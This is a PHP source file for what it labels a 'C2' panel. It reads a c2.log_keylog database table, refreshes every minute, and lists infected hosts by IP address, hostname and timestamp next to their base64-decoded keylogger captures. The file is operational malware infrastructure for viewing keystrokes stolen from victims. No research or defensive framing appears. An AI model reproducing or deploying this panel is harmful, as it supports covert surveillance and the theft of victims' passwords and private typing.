
<?php

include 'conf.php';
include 'db.php';

?>

<html>

<head>
<meta http-equiv="refresh" content="60">


<?php
include 'header.php';
?>



</head>

<body>
<br>
<div class="container-fluid">
<table  class="table table-bordered table-hover">
<thead>
<tr>
	<td colspan="4" align="center"><h3>C2</h3></td>
</tr>

<tr>
	<th align="center">Indirizzo IP</td>
	<th align="center">Hostname</td>
	<th align="center">Timestamp</td>
    <th align="center">Keylogger</td>

</tr>
</thead>
<tbody>
<tr>
	<td colspan="4">&nbsp;</td> 
</tr>


<?php


$sql = "SELECT * FROM c2.log_keylog order by timestamp DESC";
$result = $conn->query($sql);



if ($result->num_rows > 0) {
	
	
  while($row = $result->fetch_assoc()) {	
  
  
  	$b = $row["b64"];
    $data = base64_decode($b);
	
	echo "<tr><td>" . $row["ip_address"] . "</td><td>" . $row["hostname"] . "</td><td>". $row["timestamp"] . "</td><td><textarea rows='6' cols='300' id='data'>" . $data . "</textarea></div></td></tr>";
  
  
  
  
  }
} 



 
?>


<tr>
	<td colspan="4">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="key.php">Update</a>&nbsp;|&nbsp;<a href="index.php">Home</a></td>
</tr>


</tbody>
</table>
</div>
</body>
</html>